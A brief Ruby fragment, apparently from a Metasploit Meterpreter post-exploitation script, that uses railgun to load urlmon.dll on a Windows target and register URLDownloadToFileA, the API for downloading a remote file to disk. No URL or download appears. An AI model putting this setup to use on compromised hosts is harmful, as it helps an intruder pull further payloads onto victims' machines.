if client.railgun.get_dll('urlmon') == nil
print_status("Adding Function")
end
client.railgun.add_dll('urlmon','C:\\WINDOWS\\system32\\urlmon.dll')
client.railgun.add_function('urlmon','URLDownloadToFileA','DWORD',[
["DWORD","pcaller","in"],
["PCHAR","szURL","in"],
["PCHAR","szFileName","in"],
["DWORD","Reserved","in"],
["DWORD","lpfnCB","in"],
])
